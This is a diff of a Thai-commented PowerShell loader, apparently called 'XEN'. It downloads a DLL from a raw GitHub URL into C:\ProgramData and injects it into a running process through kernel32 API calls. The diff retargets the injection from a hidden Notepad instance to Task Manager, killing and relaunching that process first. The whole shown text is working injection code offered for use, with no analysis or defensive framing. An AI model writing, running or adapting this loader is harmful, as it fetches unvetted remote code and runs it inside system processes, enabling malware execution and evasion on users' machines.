@@ -60,12 +60,12 @@ function Run-AutoClean {
 Run-AutoClean
 $DLL_URL = "https://raw.githubusercontent.com/aspectxxyz/dllxen/refs/heads/main/nvoifapi64.dll" 
 $DllPath = "C:\ProgramData\nvoifapi64.dll"
-$ProcessName = "notepad"
+$ProcessName = "Taskmgr"  # เปลี่ยนเป้าหมายมาที่ Task Manager
 
 function Show-Menu {
     Clear-Host
     Write-Host "=========================================" -ForegroundColor Cyan
-    Write-Host "                 XEN         " -ForegroundColor Yellow
+    Write-Host "                XEN          " -ForegroundColor Yellow
     Write-Host "=========================================" -ForegroundColor Cyan
     
     # ตรวจสอบสถานะว่ามีไฟล์ DLL อยู่ใน Path หรือยัง
@@ -111,28 +111,26 @@ do {
                 }
             }
             
-            # โหมด INJECT: เคลียร์ Notepad เก่าทิ้งก่อนทุกครั้ง เพื่อป้องกันการติดค้าง
-            Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+            # เคลียร์ Taskmgr เก่าทิ้งก่อนทุกครั้ง
+            Get-Process -Name Taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force
             Start-Sleep -Seconds 1
 
-            Write-Host "`n[->] กำลังดำเนินการ Inject DLL..." -ForegroundColor Cyan
+            Write-Host "`n[->] กำลังเปิด Task Manager และ Inject DLL..." -ForegroundColor Cyan
             
-            # เปิด Notepad แบบ Hidden ตัวใหม่สดๆ
-            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-            $processStartInfo.FileName = "C:\Windows\System32\notepad.exe"
-            $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-            [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
+            # เปิด Taskmgr แบบปกติ (ไม่ซ่อนหน้าต่าง)
+            Start-Process "C:\Windows\System32\Taskmgr.exe"
             
             Start-Sleep -Seconds 2
             $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
 
             if (-not $process) {
-                Write-Host "[-] ไม่สามารถเปิดหรือดึง Process ของ Notepad ได้" -ForegroundColor Red
+                Write-Host "[-] ไม่สามารถเปิดหรือดึง Process ของ Task Manager ได้" -ForegroundColor Red
                 Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                 continue
             }
 
             Write-Host "[+] PID เป้าหมาย: $($process.Id)" -ForegroundColor Green
+            
             # ประกาศ Win32 API
             $Signature = @"
 [DllImport("kernel32.dll", SetLastError = true)]
@@ -198,7 +196,7 @@ public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
                 continue
             }
 
-            Write-Host "[+] ฉีด DLL เข้า Notepad สำเร็จเรียบร้อยแล้ว!" -ForegroundColor Cyan
+            Write-Host "[+] ฉีด DLL เข้า Task Manager สำเร็จเรียบร้อยแล้ว!" -ForegroundColor Cyan
             $Win32API::CloseHandle($hThread) | Out-Null
             $Win32API::CloseHandle($hProcess) | Out-Null
             
